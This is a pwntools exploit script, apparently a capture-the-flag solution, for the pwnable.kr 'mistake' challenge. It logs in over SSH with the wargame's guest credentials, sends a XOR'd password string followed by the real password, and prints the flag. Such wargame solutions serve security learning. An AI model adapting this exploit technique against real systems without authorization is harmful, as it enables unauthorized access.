#!/usr/bin/env python3

from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        conn = ssh(host='pwnable.kr', user='mistake', password='guest', port=2222)
        return conn.process('./mistake')
    else:  # Run locally
        pty = process.PTY
        return process([exe] + argv, stdin=pty, stdout=pty)


# Specify your GDB script here for debugging
gdbscript = '''
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './mistake_recompiled'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

io = start()

password = '0123456789'
xor_password = b''.join([f'{int(x) ^ 1}'.encode() for x in password])

# Send the xor payload
io.sendlineafter(b'do not bruteforce...\n', xor_password)

# Send the password
io.sendlineafter(b'input password : ', password.encode())

# Receive the flag
io.recvline()
flag = io.recvline().decode()
io.close()

print('Flag:', flag)
